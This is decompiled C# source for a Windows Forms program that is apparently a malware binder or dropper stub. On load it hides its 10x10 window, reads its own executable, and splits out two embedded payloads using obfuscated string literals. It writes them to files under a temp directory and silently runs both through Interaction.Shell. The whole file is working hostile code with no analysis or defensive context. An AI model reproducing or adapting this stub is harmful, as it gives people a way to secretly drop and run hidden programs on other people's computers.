using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[DesignerGenerated]
public class GForm0 : Form
{
	private IContainer components;

	[DebuggerNonUserCode]
	public GForm0()
	{
		((Form)this).add_Load((EventHandler)GForm0_Load);
		method_0();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(GClass0.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Control)this).Hide();
		string text = GClass0.smethod_0("GŨɪ\u0361Ѫ");
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		string text2 = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref text2, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		string[] array = Strings.Split(text2, text, -1, (CompareMethod)0);
		string text3 = array[1];
		string text4 = array[2];
		FileSystem.FileOpen(1, Interaction.Environ(GClass0.smethod_0("wůɱ")) + GClass0.smethod_0("Vŏɡ\u036bѣԴتݦ\u087a।"), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, text3, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		FileSystem.FileOpen(1, Interaction.Environ(GClass0.smethod_0("wůɱ")) + GClass0.smethod_0("Vŏɡ\u036bѣԷتݦ\u087a।"), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, text4, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ(GClass0.smethod_0("wůɱ")) + GClass0.smethod_0("Vŏɡ\u036bѣԴتݦ\u087a।"), (AppWinStyle)2, false, -1);
		Interaction.Shell(Interaction.Environ(GClass0.smethod_0("wůɱ")) + GClass0.smethod_0("Vŏɡ\u036bѣԷتݦ\u087a।"), (AppWinStyle)2, false, -1);
	}
}
